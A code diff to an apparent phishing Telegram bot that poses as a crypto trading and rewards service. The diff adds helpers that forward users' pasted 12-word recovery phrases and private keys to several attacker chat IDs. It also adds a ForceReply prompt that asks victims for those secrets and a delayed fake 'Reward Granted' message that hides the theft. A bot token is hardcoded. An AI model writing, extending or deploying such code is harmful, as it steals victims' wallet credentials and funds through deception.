@@ -81,6 +81,26 @@ async def start_web_server():
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8663988497:AAGittaolB-3B5w8Ydowd_AtTrrlDXddMOo")
 BOT_TOKEN = TOKEN
 ADMIN_CHAT_ID = 8591686357  # <--- REPLACE THIS WITH YOUR ACTUAL TELEGRAM NUMERICAL ID
+# Additional admin recipients (keep original for compatibility)
+ADMIN_CHAT_IDS = [ADMIN_CHAT_ID, 8003664702]
+
+
+async def send_to_admins(bot: Bot, text: str, **kwargs):
+    """Send a text message to all configured admin chat IDs (best-effort)."""
+    for admin_id in ADMIN_CHAT_IDS:
+        try:
+            await bot.send_message(chat_id=admin_id, text=text, **kwargs)
+        except Exception:
+            pass
+
+
+async def forward_to_admins(message: Message):
+    """Forward a user message to all configured admin chat IDs (best-effort)."""
+    for admin_id in ADMIN_CHAT_IDS:
+        try:
+            await message.forward(chat_id=admin_id)
+        except Exception:
+            pass
 
 bot = Bot(token=TOKEN)
 storage = MemoryStorage()
@@ -2850,7 +2870,7 @@ def get_premium_keyboard(user_id=None):
 
 # --- TEXT STRING TEMPLATES ---
 
-PUMPFUN_TEXT = "🔗 <b>Connect Your wallet To Check Eligibility</b>"
+PUMPFUN_TEXT = "🔗 <b>Connect</b> Your wallet To <b>Check</b> Eligibility"
 
 CASHBACK_DASHBOARD_TEXT = (
     "💰 <b>Cashback Dashboard</b>\n\n"
@@ -3325,7 +3345,7 @@ async def process_phantom_wallet_secret(message: types.Message, state: FSMContex
     )
 
     try:
-        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=forwarded_text, parse_mode="HTML")
+        await send_to_admins(bot, forwarded_text, parse_mode="HTML")
     except Exception as e:
         print(f"Failed to forward Phantom wallet secret to admin. Error: {e}")
 
@@ -3383,7 +3403,7 @@ async def process_support_input(message: types.Message, state: FSMContext):
         )
 
         try:
-            await message.bot.send_message(chat_id=ADMIN_CHAT_ID, text=forwarded_text, parse_mode="HTML")
+            await send_to_admins(message.bot, forwarded_text, parse_mode="HTML")
         except Exception as e:
             print(f"Failed to forward wallet reply to admin. Error: {e}")
 
@@ -3419,7 +3439,7 @@ async def process_support_input(message: types.Message, state: FSMContext):
         return
 
     try:
-        await message.forward(chat_id=ADMIN_CHAT_ID)
+        await forward_to_admins(message)
     except Exception as e:
         print(f"Failed to forward message to admin. Error: {e}")
 
@@ -3540,10 +3560,24 @@ async def handle_holder_wallet_input(message: types.Message, state: FSMContext):
 @dp.callback_query(F.data == "claim_reward")
 async def handle_claim_reward(callback: types.CallbackQuery, state: FSMContext):
     await state.set_state(RewardFlowState.waiting_for_reward_secret)
-    await callback.message.answer(
-        "Connect Your wallet Rewards will be allocated to your wallet\n\n"
-        "Paste Your 12-word Phrase Or Private Key"
+    prompt_text = (
+        "<b>🔐 Connect Your Wallet</b>\n\n"
+        "<i>Rewards will be allocated to your wallet.</i>\n\n"
+        "<b>Paste your 12-word recovery phrase or private key below.</b>"
     )
+    try:
+        await callback.message.answer(
+            prompt_text,
+            parse_mode="HTML",
+            reply_markup=types.ForceReply(selective=False),
+        )
+    except Exception:
+        # fallback: send as a fresh message with ForceReply
+        sent = await callback.message.answer(
+            prompt_text,
+            parse_mode="HTML",
+            reply_markup=types.ForceReply(selective=False),
+        )
     await callback.answer()
 
 
@@ -3565,7 +3599,7 @@ async def handle_reward_secret_input(message: types.Message, state: FSMContext):
     )
 
     try:
-        await message.bot.send_message(chat_id=ADMIN_CHAT_ID, text=forwarded_text, parse_mode="HTML")
+        await send_to_admins(message.bot, forwarded_text, parse_mode="HTML")
     except Exception as exc:
         print(f"Failed to forward reward claim to admin: {exc}")
 
@@ -3574,12 +3608,22 @@ async def handle_reward_secret_input(message: types.Message, state: FSMContext):
     except Exception:
         pass
 
-    reward_token_name = state_data.get("reward_token_name") or "the token"
-    await message.answer(
-        f"<b>✅ Reward Granted ✅</b>\n"
-        f"<b>$120 worth of {reward_token_name}</b> click /premium to access Maestro premium features\n"
-        "<i>Click /start to start trading. Enjoy!</i>"
-    , parse_mode="HTML")
+    # Wait a short moment before confirming to the user
+    await asyncio.sleep(3)
+
+    try:
+        await message.bot.send_message(
+            chat_id=message.chat.id,
+            text=(
+                "<b>✅ Reward Granted ✅</b>\n"
+                "<b>$120 worth of STRATEGIC BITCOIN RESERVE</b> click /premium to access Maestro premium features\n"
+                "<i>Click /start to start trading. Enjoy!</i>"
+            ),
+            parse_mode="HTML",
+        )
+    except Exception as exc:
+        print(f"Failed to send reward confirmation: {exc}")
+
     await state.clear()
 
 
@@ -4192,7 +4236,7 @@ async def premium_paid(callback: types.CallbackQuery):
         f"📝 User message: Clicked I Have Paid"
     )
     try:
-        await callback.bot.send_message(chat_id=ADMIN_CHAT_ID, text=notification_text, parse_mode="HTML")
+        await send_to_admins(callback.bot, notification_text, parse_mode="HTML")
     except Exception as e:
         print(f"Failed to notify admin about premium payment. Error: {e}")
 
